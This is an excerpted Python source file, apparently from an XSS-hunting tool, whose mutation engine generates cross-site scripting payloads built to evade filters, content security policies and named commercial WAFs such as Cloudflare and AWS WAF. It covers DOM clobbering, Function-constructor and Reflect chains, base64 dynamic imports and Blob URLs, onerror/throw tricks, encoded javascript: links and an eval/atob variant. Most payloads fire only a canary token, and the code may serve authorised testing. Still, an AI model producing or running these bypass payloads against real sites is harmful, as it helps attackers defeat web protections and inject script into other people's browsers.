...
class MutationEngine:
    ...
    @staticmethod
    def apply_extreme_clobbering_bypass(payload: str) -> List[str]:
        """Generate completely quote-free and slash-free HTML entity-encoded DOM clobbering bypass payloads."""
        action = payload
        js_payload = action
        if "javascript:" in js_payload.lower():
            js_payload = js_payload.replace("javascript:", "")
        ...
        for name in config_names[:3]:
            for prop in property_names[:3]:
                # Completely quote-free and slash-free anchors clobbering structure
                variants.append(f"<a id={name}><a id={name} name={prop} href={encoded_href}>")
    ...
    @staticmethod
    def apply_js_constructor_obfuscation(payload: str) -> str:
        """Obfuscate JS calls using constructor chains of native types to bypass keyword/parenthesis filters."""
        import re
        import random
        ...
        def repl(match):
            ...
            if func_name.lower() in ['alert', 'eval', 'settimeout', 'setinterval', '__xss__']:
                code_str = f"{func_name}({args})"
                escaped_code = code_str.replace("'", "\\'").replace('"', '\\"')
                
                variants = [
                    f"[].filter.constructor('{escaped_code}')()",
                    f"[].keys.constructor('{escaped_code}')()",
                    f"Reflect.construct(Function, ['{escaped_code}'])()",
                    f"Object.constructor('{escaped_code}')()",
                ]
                return random.choice(variants)
            return match.group(0)
            
        return re.sub(pattern, repl, payload, flags=re.IGNORECASE)

    @staticmethod
    def apply_dynamic_import_obfuscation(payload: str) -> str:
        """Wrap JS calls inside an ES6 dynamic import block to bypass strict CSPs and WAF keyword filters."""
        import re
        import base64
        import random
        ...
        def repl(match):
            ...
            if func_name.lower() in ['alert', 'eval', 'settimeout', 'setinterval', '__xss__']:
                ...
                variants = [
                    f"import('data:text/javascript;base64,{b64_code}')",
                    f"import('data:text/javascript,eval(atob(\'{b64_code}\'))')",
                ]
                return random.choice(variants)
            return match.group(0)
    ...
    @staticmethod
    def apply_advanced_import_bypass(payload: str) -> List[str]:
        """Generate ultra-advanced ES6 dynamic import and client-side Blob execution bypass variants."""
        import re
        import base64
        import random
        
        # Extract the token and original call
        pattern = r'\b([a-zA-Z0-9_$]+)\s*\(([^)]*)\)'
        
        variants = []
        
        # Match function calls like alert(1), __XSS__('token')
        ...
        # Variant 1: Obfuscated Dynamic Import with Blob URL
        blob_js = f"import(URL.createObjectURL(new Blob([atob('{b64_code}')],{{type:'text/javascript'}})))"
        variants.append(blob_js)
        
        # Variant 2: Fully Obfuscated Blob URL Import (no direct string matches for URL, createObjectURL, Blob, type)
        obfuscated_blob_js = (
            f"import(window['UR'+'L']['createOb'+'jectURL']("
            f"new window['Bl'+'ob']([atob('{b64_code}')],"
            f"{{'ty'+'pe':'text/ja'+'vascript'}})))"
        )
        variants.append(obfuscated_blob_js)
        
        # Variant 3: Constructor Function Import
        ctor_js = f"[].constructor.constructor('imp'+'ort(\\'data:text/javascript;base64,{b64_code}\\')')()"
        variants.append(ctor_js)
        
        # Variant 4: Constructor Blob Function Import
        ctor_blob_js = (
            f"[].constructor.constructor('imp'+'ort(URL.createObjectURL(new Blob([atob(\\'{b64_code}\\')],{{type:\\'text/javascript\\'}})))')()"
        )
        variants.append(ctor_blob_js)

        # Variant 5: Reflect.construct dynamic import resolver
        reflect_js = (
            f"Reflect.construct(Function, ['imp'+'ort(\\'data:text/javascript;base64,{b64_code}\\')'])()"
        )
        variants.append(reflect_js)
    ...
    def apply_template_tag_calls(payload: str) -> List[str]:
        ...
        variants = []
        pattern = r'\b(__XSS__|alert|confirm|prompt|setTimeout|Function)\s*\(\s*([\'\"])(.*?)\2\s*\)'
        for match in re.finditer(pattern, payload):
    ...
    def apply_all_mutations(
        ...
        if strategy == "smart_adaptive":
            # Compact, deterministic diversity for the default real-world hunt:
            # keep generation cheap while covering common WAF/filter transformations.
            ...
            mutations.append(safe(MutationEngine.apply_dynamic_import_obfuscation))
            mutations.append(safe(MutationEngine.apply_alternative_whitespace))
            ...
            mutations.extend(expand(MutationEngine.apply_advanced_import_bypass))
            mutations.extend(expand(MutationEngine.apply_extreme_clobbering_bypass))
    ...
    def apply_cookie_tossing(payload: str) -> List[str]:
        """Detect cookie-capable execution without modifying the target cookie jar."""
        token = MutationEngine._extract_token_from_payload(payload)
        cookie_payload = f"if(navigator.cookieEnabled){{__XSS__('{token}')}}"
        return [
    ...
    def apply_some_taint_theft(payload: str) -> List[str]:
        """Probe same-origin opener access without reading or transmitting page content."""
        token = MutationEngine._extract_token_from_payload(payload)
        steal_payload = (
            "try{if(window.opener){void window.opener.location.href;"
            f"__XSS__('{token}')"
            "}}catch(e){}"
        )
        return [
    ...
    def apply_webview_sandbox_escape(payload: str) -> List[str]:
        """Detect an exposed Android-style bridge without invoking native methods."""
        token = MutationEngine._extract_token_from_payload(payload)
        escape_payload = (
            "try{"
            ...
            "}"
            "}"
            f"if(bridgeFound){{__XSS__('{token}')}}"
            "}catch(e){}"
        )
        return [
    ...
    def apply_cache_poisoning_bypass(payload: str) -> List[str]:
        """Probe hash/storage second-stage reachability without eval or cache mutation."""
        token = MutationEngine._extract_token_from_payload(payload)
        loop_payload = f"if(window.localStorage){{__XSS__('{token}')}}"
        hash_payload = f"if(window.location.hash.length>1){{__XSS__('{token}')}}"
        return [
    ...
    def apply_webview_ipc_escape(payload: str) -> List[str]:
        """Detect WebView IPC bridge exposure without sending privileged messages."""
        token = MutationEngine._extract_token_from_payload(payload)
        ipc_payload = (
            "try{"
            "let ipcFound=(typeof vscode!=='undefined'&&typeof vscode.postMessage==='function')||"
            "(typeof window.chrome!=='undefined'&&window.chrome.webview&&typeof window.chrome.webview.postMessage==='function');"
            f"if(ipcFound){{__XSS__('{token}')}}"
            "}catch(e){}"
        )
        return [
    ...
    def apply_postmessage_window_name_escape(payload: str) -> List[str]:
        """Send a harmless, namespaced message canary without reading adjacent frames."""
        token = MutationEngine._extract_token_from_payload(payload)
        escape_payload = (
            "try{"
            f"window.parent.postMessage({{type:'xssboss-capability-canary',token:'{token}'}},'*');"
            f"__XSS__('{token}');"
            "}catch(e){}"
        )
        return [
    ...
    @staticmethod
    def apply_unicode_nfkc_normalization(payload: str) -> List[str]:
        """Translate ASCII tag brackets to full-width Unicode forms normalized by NFKC filters."""
        nfkc_map = {'<': '\uff1c', '>': '\uff1e', '"': '\uff02', "'": '\uff07', '(': '\uff08', ')': '\uff09'}
        mutated = payload
        for char, unicode_char in nfkc_map.items():
            mutated = mutated.replace(char, unicode_char)
        return [mutated] if mutated != payload else []

    @staticmethod
    def apply_parentheseless_throw(payload: str) -> List[str]:
        """Convert parenthesized oracle execution into parentheseless window.onerror throw statements."""
        token = MutationEngine._extract_token_from_payload(payload)
        return [
            f"<img src=x onerror=\"window.onerror=eval;throw'=__XSS__(\\'{token}\\')'\">",
            f"<svg onload=\"window.onerror=eval;throw'=__XSS__(\\'{token}\\')'\">",
            f"<body onload=\"window.onerror=eval;throw'=__XSS__(\\'{token}\\')'\">",
        ]

    @staticmethod
    def apply_es6_reflect_proxy_obfuscation(payload: str) -> List[str]:
        """Wrap payload execution in ES6 Reflect and Proxy meta-programming constructs."""
        token = MutationEngine._extract_token_from_payload(payload)
        return [
            f"<svg onload=\"Reflect.apply(window['__XSS__'],window,['{token}'])\">",
            f"<img src=x onerror=\"[].filter.constructor('__XSS__(\\'{token}\\')')()\">",
            f"<svg onload=\"(async()=>await import('data:text/javascript,__XSS__(\\'{token}\\')'))()\">",
        ]

    @staticmethod
    def apply_waf_specific_evasions(payload: str, waf_name: Optional[str] = None) -> List[str]:
        """Generate targeted WAF bypass mutations for Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity."""
        token = MutationEngine._extract_token_from_payload(payload)
        waf = (waf_name or "").lower().strip()
        variants = []

        if waf in ["cloudflare", "all", ""]:
            variants.extend([
                f"<svg/onload=__XSS__`{token}`>",
                f"<a href=\"jav&Tab;ascript&colon;__XSS__('{token}')\">click</a>",
                f"<img src=x onerror=\"window['ev'+'al'](window['at'+'ob']('X19YU1NfXygne3tUT0tFTn19Jyk='))\">",
            ])

        if waf in ["aws_waf", "all", ""]:
            variants.extend([
                f"<svg><![CDATA[><script>__XSS__('{token}')</script>]]></svg>",
                f"<details open ontoggle=\"__XSS__('{token}')\">",
            ])

        if waf in ["modsecurity", "f5_big_ip", "all", ""]:
            variants.extend([
                f"<script/**/type=\"text/javascript\">__XSS__('{token}')</script>",
                f"<svg/onload=fetch('//'&#43;'{token}')>",
            ])
